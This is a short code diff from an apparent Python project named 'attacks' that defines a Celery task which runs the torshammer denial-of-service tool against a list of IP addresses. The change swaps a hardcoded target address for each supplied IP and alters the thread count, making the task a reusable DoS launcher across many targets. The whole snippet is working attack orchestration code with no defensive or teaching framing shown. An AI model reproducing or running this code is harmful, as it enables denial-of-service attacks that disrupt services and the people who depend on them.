@@ -15,18 +15,18 @@ from attacks.celery import app
 def torshammer(ip_addresses, port):
     for ip_address in ip_addresses:
        
-        #command = "python2.7 torshammer.py -t {} -p {} -r 80000".format(ip_address, port)
-        #os.system(command)
+       
        
         #140.30.20.5
       #  command = "python2.7 torshammer.py -t {} -p {} -r 80000".format("140.30.20.5", port)
       #  os.system(command)
-        command = ["python2.7", "torshammer.py", "-t", "140.30.20.5", "-p", str(port), "-r", "80000"]
+        
+        #command = ["python2.7", "torshammer.py", "-t", "140.30.20.5", "-p", str(port), "-r", "260"]
+        command = ["python2.7", "torshammer.py", "-t", str(ip_address), "-p", str(port), "-r", "260"]
         #subprocess.call(command)
         #subprocess.run(command, timeout=60)
         try:
           completed_process = subprocess.run(command, timeout=60)
-          #subprocess.call(command)
         except subprocess.TimeoutExpired:
             print("El comando ha excedido el tiempo de espera de 60 segundos.")
 
